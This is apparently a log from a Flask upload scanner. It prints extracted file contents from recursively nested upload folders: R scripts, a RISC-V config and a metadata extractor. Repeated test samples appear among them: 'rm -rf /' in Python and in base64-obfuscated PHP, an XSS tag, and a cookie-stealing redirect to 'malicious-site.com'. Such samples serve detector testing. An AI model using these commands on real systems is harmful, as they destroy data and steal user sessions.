from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:33,639 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:33,640 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:33,642 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:33,643 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,645 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,646 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,647 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,648 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,649 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:33,654 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,655 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,656 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,657 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,658 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,659 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,661 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,662 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:33,663 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,664 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:33,665 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,666 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,667 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,668 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,670 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,671 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,672 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:33,673 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,674 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:33,675 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,676 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,677 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,678 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,679 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,680 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,681 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:38:33,683 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,684 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:38:33,685 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:38:33,686 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:33,688 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:33,690 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:33,692 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:33,693 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,695 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,696 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,697 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,698 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,699 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:33,705 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,706 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,708 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:33,710 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:33,712 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:33,714 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:33,715 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,716 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,718 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,719 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,720 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,721 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:33,726 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,727 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,729 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:33,731 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:33,732 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:33,735 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:33,736 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,737 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,738 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,739 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,740 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,741 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:33,747 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,749 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,750 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:38:33,753 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:38:33,754 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:38:33,757 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:38:33,758 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,759 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,760 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,761 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,763 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,764 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:38:33,769 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,770 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:38:33,771 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:38:33,773 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:38:33,774 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:38:33,775 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:38:33,776 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:38:33,777 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
